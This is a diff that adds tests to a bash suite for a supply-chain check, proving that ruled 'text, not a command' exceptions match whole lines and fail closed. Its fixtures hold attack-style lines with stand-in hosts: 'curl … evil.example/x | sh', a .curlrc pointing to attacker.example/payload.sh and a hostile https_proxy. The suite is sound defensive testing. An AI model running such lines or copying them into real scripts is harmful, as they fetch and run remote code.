@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3
+# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC16
 # The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
 # package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
 # repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
@@ -896,6 +896,337 @@ assert imgs(sh), "the same in a script"
 assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "an option's value that spells --pull=never is not a policy"
 cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
 assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
+PY
+
+# --- REQ-SUP-001-AC16: ruled text lines. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's
+# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 16-hex hash of the downloader segment), line (the 16-hex hash of the
+# WHOLE flattened line the segment sits in), ruling[, count]}. A matching row reports the item
+# as ruled text; no row, a wrong hash (an edited line), a row on the pull request's side only, or more occurrences than the row counts fail as before;
+# a malformed list stops the check (exit 2), never "nothing exempted" and never "everything exempted". -------------------------------------------------------
+rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
+pyw() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }   # python that writes FILE with TEXT
+newcase rt "$(pyw bin/ruled.sh "$rtext")"
+# rtrows REPO OUT MODE: writes an exceptions file whose unmeasured_text rows are built from the REAL scan of REPO (HEAD~1..HEAD), changed by MODE
+rtrows() {
+  python3 - "$chk" "$1" "$2" "$3" <<'PY'
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+repo, out, mode = sys.argv[2:5]
+added = ac._added_unmeasured(repo, "HEAD~1", "HEAD")
+import hashlib, re, subprocess
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+def lines_for(f, kh):   # an independent oracle: the whole flattened lines (as the scan flattens them) that hold a segment, or are a line, hashing to kh
+    text = subprocess.run(["git", "-C", repo, "show", "HEAD:" + f], capture_output=True, text=True, check=True).stdout
+    out = []
+    for line in re.sub(r"\\\n\s*", " ", text).split("\n"):
+        flat = " ".join(line.split())
+        if flat and (H(flat) == kh or any(H(s) == kh for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat))) and H(flat) not in out:
+            out.append(H(flat))
+    return out
+rows = [{"file": f, "form": w, "key": k.split(":", 1)[0], "line": lh, "ruling": "text, not a command: a test line"} for f, w, k in added for lh in lines_for(f, k.split(":", 1)[0])]
+assert len(rows) >= len(added), (rows, added)
+raw = None
+d = {"_format": "t", "exceptions": []}
+if mode == "all": pass
+elif mode == "first": rows = rows[:1]
+elif mode == "none": rows = []
+elif mode == "wronghash": rows[0]["key"] = ("0" if rows[0]["key"][0] != "0" else "1") + rows[0]["key"][1:]
+elif mode == "wrongfile": rows = [dict(r, file="bin/other.sh") for r in rows]
+elif mode == "wrongform": rows = [dict(r, form="a system package install") for r in rows]
+elif mode == "emptyruling": rows[0]["ruling"] = ""
+elif mode == "spaceruling": rows[0]["ruling"] = " \t "
+elif mode == "noruling": del rows[0]["ruling"]
+elif mode == "nokey": del rows[0]["key"]
+elif mode == "intkey": rows[0]["key"] = 12345
+elif mode == "shortkey": rows[0]["key"] = rows[0]["key"][:12]
+elif mode == "fullkey": rows[0]["key"] = added[0][2]
+elif mode == "upperkey": rows[0]["key"] = rows[0]["key"].upper()
+elif mode == "dup": rows = rows + rows[:1]
+elif mode == "extra": rows[0]["note"] = "x"
+elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["form"], rows[0]["key"], rows[0]["line"], rows[0]["ruling"]]
+elif mode == "noline": del rows[0]["line"]
+elif mode == "intline": rows[0]["line"] = 7
+elif mode == "shortline": rows[0]["line"] = rows[0]["line"][:15]
+elif mode == "upperline": rows[0]["line"] = rows[0]["line"].upper()
+elif mode == "wrongline": rows[0]["line"] = ("0" if rows[0]["line"][0] != "0" else "1") + rows[0]["line"][1:]
+elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "unmeasured_text": ' + json.dumps(rows) + '}'
+elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "ruling": "text, not a command: another ruling"}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
+elif mode == "count0": rows[0]["count"] = 0
+elif mode == "countbool": rows[0]["count"] = True
+elif mode == "countstr": rows[0]["count"] = "2"
+elif mode == "count1": rows = [dict(r, count=1) for r in rows]
+elif mode == "count2": rows = [dict(r, count=2) for r in rows]
+elif mode == "count100": rows = [dict(r, count=100) for r in rows]
+elif mode == "count101": rows[0]["count"] = 101
+elif mode == "countfloat": rows[0]["count"] = 2.0
+elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": ' + json.dumps(rows) + '}'
+elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": ' + json.dumps(rows) + '}'
+elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
+elif mode == "notlist": rows = {"rows": rows}
+elif mode == "emptyfile": rows[0]["file"] = ""
+else: raise SystemExit("unknown mode " + mode)
+d["unmeasured_text"] = rows
+if raw is not None:
+    open(out, "w").write(raw)
+else:
+    json.dump(d, open(out, "w"), indent=2)
+PY
+}
+rtck() { # REPO MODE [extra args] -> rc, $work/rt.out
+  local repo=$1 mode=$2; shift 2; rtrows "$work/$repo" "$work/rt-$mode.json" "$mode"; rc=0
+  python3 "$chk" --root "$work/$repo" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --json "$work/rt.json" --exceptions "$work/rt-$mode.json" "$@" >"$work/rt.out" 2>&1 || rc=$?
+}
+CASE="AC16 setup: the fixture adds exactly two unmeasured text lines (a comment and an echo that mention a download tool), the scan stays strict"
+check python3 - "$chk" "$work/rt" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+a = ac._added_unmeasured(sys.argv[2], "HEAD~1", "HEAD")
+assert len(a) == 2 and all(x[0] == "bin/ruled.sh" and x[1] == "a download" for x in a), a
+PY
+rtck rt all
+CASE="AC16: a base-branch row for each added text line (file, form, line hash, ruling) passes: exit 0, each reported as ruled text with its ruling"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2; check grep -q 'text, not a command: a test line' "$work/rt.out"
+check python3 -c "import json,sys; r=json.load(open(sys.argv[1]))['moved']; assert len(r)==2 and all(x['ok'] and 'ruled text' in x['reason'] for x in r), r" "$work/rt.json"
+rtck rt first
+CASE="AC16: a row exempts exactly its own item: the other added line has no row and fails (exit 1), named as unmeasured, while the ruled one is reported as ruled"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
+rtck rt none
+CASE="AC16: an empty unmeasured_text list exempts nothing: both added lines fail (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
+rtck rt wronghash
+CASE="AC16: a row whose line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
+for m in wrongfile wrongform; do rtck rt $m
+CASE="AC16: a row with the right hash but the wrong ${m#wrong} does not apply: both items fail (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2; done
+rtck rt wrongline
+CASE="AC16: a row whose WHOLE-line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
+rtrows "$work/rt" "$work/rt-orig.json" all
+newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
+rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
+CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
+for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat nantop infnested neginfrow; do rtck rt $m
+CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
+check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
+printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
+python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-badjson.json" >"$work/rt.out" 2>&1 || rc=$?
+CASE="AC16: an exceptions file that is not JSON stops the check (exit 2), never 'nothing ruled'"
+check test "$rc" -eq 2
+rc=0; python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/does-not-exist.json" >"$work/rt.out" 2>&1 || rc=$?
+CASE="AC16: an --exceptions path that does not exist stops the check (exit 2)"
+check test "$rc" -eq 2
+echo '{"exceptions": []}' >"$work/rt-nolist.json"; rc=0
+python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-nolist.json" >"$work/rt.out" 2>&1 || rc=$?
+CASE="AC16: a file with no unmeasured_text list rules nothing: the added lines fail as before (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
+# the same line twice: a row covers ONE occurrence unless it says count
+newcase rt2 "$(pyw bin/ruled.sh "$rtext${rtext#*$'\n'}")"
+rtck rt2 all
+CASE="AC16: the same text lines added TWICE need rows that count both: a row without count covers one occurrence, so the items fail (exit 1)"
+check test "$rc" -eq 1
+rtck rt2 count1
+CASE="AC16: count 1 on lines added twice fails too (exit 1)"
+check test "$rc" -eq 1
+rtck rt2 count2
+CASE="AC16: count 2 on lines added twice passes (exit 0)"
+check test "$rc" -eq 0
+# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
+# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
+cat >"$work/sx-ruled.txt" <<'EOF'
+    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
+EOF
+cat >"$work/sx-attack.txt" <<'EOF'
+echo 'url = https://attacker.example/payload.sh' > ~/.curlrc
+export https_proxy=http://attacker.example:3128
+echo $'x|\n      curl -s https://evil.example/x |y' | sh
+EOF
+cat >"$work/sx-other.txt" <<'EOF'
+echo 'a|\n      curl -s https://evil.example/x|b' | bash
+EOF
+newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
+rtrows "$work/sx" "$work/rt-sx.json" all
+sxck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-sx.json" >"$work/rt.out" 2>&1 || rc=$?; }
+sxck sx
+CASE="AC16 (whole line): the ruled line itself, with its row (segment hash and whole-line hash), passes (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
+newcase sxa "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-attack.txt")")"
+sxck sxa
+CASE="AC16 (whole line): the Sonnet reproduction (the ruled segment embedded in another line that pipes to sh, next to a .curlrc and a proxy) FAILS (exit 1): not ruled"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/build-helpers-test.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+newcase sxo "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-other.txt")")"
+sxck sxo
+CASE="AC16 (whole line): the same segment with different surrounding text in another line FAILS (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+newcase sxboth "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt" "$work/sx-attack.txt")")"
+sxck sxboth
+CASE="AC16 (whole line): the ruled line AND the segment hidden in another line in one file: the item FAILS (exit 1), the ruled line lends nothing"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+for edit in 's/b\.yaml/c.yaml/' 's/same-step/same-stop/' 's/tee -a/tee/' 's/- runs/- run/'; do
+  newcase sxe "$(pyw bin/build-helpers-test.sh "$(sed "$edit" "$work/sx-ruled.txt")")"
+  sxck sxe
+  CASE="AC16 (whole line): editing ANY part of the ruled line, even outside the downloader segment ($edit), voids its row: exit 1"
+  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+done
+newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
+sxck sxm
+CASE="AC16 (whole line): the ruled line moved to another file is not ruled: exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/other-test.sh' "$work/rt.out"
+rtck rt2 count100
+CASE="AC16: count 100 (the cap) is accepted: lines added twice pass (exit 0)"
+check test "$rc" -eq 0
+# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
+# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
+twoc() {
+  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
+  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
+import pathlib, subprocess, sys
+root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
+g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
+p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
+p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
+PY
+}
+# mkrow OUT FILE LINE [count]: one row for the download segment of LINE (first segment naming curl or wget), bound to LINE, flattened as the scan flattens
+mkrow() {
+  python3 - "$@" <<'PY'
+import hashlib, json, re, sys
+out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
+row = {"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": "text, not a command: a test line"}
+if len(sys.argv) > 4: row["count"] = int(sys.argv[4])
+json.dump({"exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
+print(row["key"], row["line"])
+PY
+}
+edck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$2" >"$work/rt.out" 2>&1 || rc=$?; }
+echo '{"exceptions": [], "unmeasured_text": []}' >"$work/rt-empty.json"
+CASE="edited line: Codex's row for bin/ruled.sh has key and line 0c81fb09bb82dffd (the scan's hashes of the ruled text)"
+check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd 0c81fb09bb82dffd"
+twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
+edck cx "$work/rt-codex.json"
+CASE="edited line (Codex, verbatim): the base has the ruled text, the head pipes the same segment to sh: an ADDITION that no row names: exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
+edck pre "$work/rt-empty.json"
+CASE="edited line (the pre-existing class): a flagged base line rewritten with the same download segment (-o /tmp/a -> | sh) is an addition: exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:tools/fetch.sh' "$work/rt.out"
+twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
+edck keep "$work/rt-empty.json"
+CASE="edited line: an untouched flagged base line stays not added (another line of the file changed): exit 0"
+check test "$rc" -eq 0
+twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
+edck ws "$work/rt-empty.json"
+CASE="edited line: a whitespace-only edit (spaces and tabs) stays not added, as the scan flattens it: exit 0"
+check test "$rc" -eq 0
+# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
+sp="echo ok # note; curl -s http://e.example/x | sh"
+mkrow "$work/rt-sp.json" bin/ruled.sh "$sp" >/dev/null
+twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
+edck sp0 "$work/rt-sp.json"
+CASE="R1 control: the space version with its row is ruled: exit 0"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
+for ch in 1f a0 0b 0c 85 0d; do
+  twoc spx bin/ruled.sh $'#!/bin/sh\n' "$(printf '#!/bin/sh\necho ok')$(python3 -c "import sys; sys.stdout.write(chr(0x$ch))")$(printf '# note; curl -s http://e.example/x | sh\nx')"
+  edck spx "$work/rt-sp.json"
+  CASE="R1: the same line with U+00$ch where the space was flattens identically but is never ruled: exit 1"
+  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+done
+mkrow "$work/rt-cont.json" bin/ruled.sh "echo a curl -s http://e.example/x" >/dev/null
+twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
+edck cont1 "$work/rt-cont.json"
+CASE="R1: a backslash-newline continuation (echo a\\<newline>curl ...) is never ruled, though it flattens to the ruled line: exit 1"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
+edck cont0 "$work/rt-cont.json"
+CASE="R1 control: the one-line version with its row is ruled: exit 0"
+check test "$rc" -eq 0
+# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
+# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
+# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
+# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
+twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
+edck ctx "$work/rt-empty.json"
+CASE="context limit (documented): a harmless ruled echo moved above its heredoc opener keeps its identity, so it is no addition (exit 0); it still only echoes"
+check test "$rc" -eq 0
+CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution"
+check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
+import hashlib, json, re, shlex, subprocess, sys
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
+    "bdc2f348c4dbc92f": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
+    "59026aa06d9188a1": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
+    "6acbb0aa471b0e3b": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
+    "77bc505e9228dc4a": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
+    "22312bde0463f438": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
+    "5839155d14e99a00": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
+    "80510e8b8f509a47": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
+    "9f54b594e70eb20f": "cat >\"$stubs/curl\" <<'EOF'",
+    "1314309c3220e619": "echo \"curl $*\" >>\"$CALLS\"",
+    "64612fb9a9fe82be": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
+}
+SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
+rows = json.load(open(sys.argv[1]))["unmeasured_text"]
+assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
+for r in rows:
+    line = LINES[r["key"]]
+    segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
+    assert H(line) == r["line"] and r["key"] in {H(s) for s in segs}, r
+    assert not re.search(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b", line), ("a substitution or eval can run anything", r)
+    if line.startswith("#"):
+        continue                                                         # a comment
+    if subprocess.run(["bash", "-n", "-c", line], capture_output=True, stdin=subprocess.DEVNULL).returncode:
+        assert re.match(r"^(for \w+ in \(|assert |ENVPK = \[\(|same-step\) |else )", line), ("a syntax error of an unexpected kind", line)
+        if not line.startswith(("same-step) ", "else ")):
+            continue                                                     # Python source: bash cannot parse it, nothing runs
+    lex = shlex.shlex(line, posix=True, punctuation_chars=True); lex.whitespace_split = True; lex.commenters = ""
+    cmds, cur = [], []
+    for tok in lex:                                                      # quote-aware: a | inside a quoted string is text, not a pipe
+        if tok in (";", ";;", "|", "||", "&&", "&"):
+            cmds.append(cur); cur = []
+        else:
+            cur.append(tok)
+    cmds.append(cur)
+    for c in cmds:
+        while c and c[0] in ("else", "then", "do"):
+            c = c[1:]
+        if len(c) > 1 and c[1] == ")":
+            c = c[2:]                                                    # a case pattern: word)
+        if c:
+            assert c[0] in SAFE, ("not a harmless command", c, r)
+PY
+# a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
+rtrows "$work/rt" "$work/rt-head.json" all
+newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
+rc=0; python3 "$chk" --root "$work/rthead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/rt.out" 2>&1 || rc=$?
+CASE="AC16: rows that only the pull request adds (its own .github/supply-chain-exceptions.json) are never read: both lines fail (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
+mkdir -p "$work/trusted-gh/agent"; cp -R "$here/../supply-chain" "$work/trusted-gh/agent/supply-chain"
+git -C "$work/rthead" show HEAD:.github/supply-chain-exceptions.json >"$work/trusted-gh/supply-chain-exceptions.json"; rc=0
+python3 "$work/trusted-gh/agent/supply-chain/pin-age-check.py" --root "$work/rthead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/rt.out" 2>&1 || rc=$?
+CASE="AC16: the default rulings file is the one beside the checkout the script runs from (CI: trusted/.github/supply-chain-exceptions.json): the same rows there pass (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2
+rm -rf "$work/trusted-gh"
+CASE="AC16: the default rulings path is the script's own checkout (.github/supply-chain-exceptions.json beside .github/agent), whatever --root says"
+check python3 - "$chk" "$root" <<'PY'
+import importlib.util, os, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
+PY
+CASE="AC16: the committed unmeasured_text rows load, and each has exactly file, form, key and line (16 lowercase hex each), a 'text, not a command:' ruling and no duplicate"
+check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
+import importlib.util, json, re, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+rows = json.load(open(sys.argv[2]))["unmeasured_text"]
+loaded = ac.load_ruled_text(sys.argv[2], required=True)
+assert rows and len(loaded) == len(rows), (len(rows), len(loaded))
+forms = {"a download"} | {w for _, w in ac.inv._UNMEASURED}
+for r in rows:
+    assert set(r) == {"file", "form", "key", "line", "ruling"}, r
+    assert re.fullmatch(r"[0-9a-f]{16}", r["line"]), r
+    assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
+    assert re.fullmatch(r"[0-9a-f]{16}", r["key"]) and r["ruling"].startswith("text, not a command: ") and len(r["ruling"]) > len("text, not a command: ") + 10, r
 PY
 
 # --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
